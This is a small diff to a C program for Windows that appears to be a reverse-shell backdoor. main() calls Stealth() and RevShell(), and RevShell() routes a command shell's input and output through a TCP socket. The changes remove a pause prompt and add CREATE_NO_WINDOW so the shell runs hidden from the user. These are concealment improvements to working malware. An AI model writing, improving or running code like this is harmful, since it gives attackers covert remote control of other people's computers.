@@ -24,7 +24,6 @@ int main(void){
 	
 	Stealth();
 	RevShell();
-	system("pause");
 	exit(0);
 }
 
@@ -70,7 +69,7 @@ void RevShell(void){
 	startupinfo.hStdError = (HANDLE)tcpsock;
 	
 	// process start
-	if (CreateProcess(NULL, cmdpath, NULL, NULL, TRUE, 0, NULL, NULL, &startupinfo, &processinfo) == 0){
+	if (CreateProcess(NULL, cmdpath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupinfo, &processinfo) == 0){
 		goto exit;
 	} else {
 		// wait for the created process to end before exiting and cleaning up
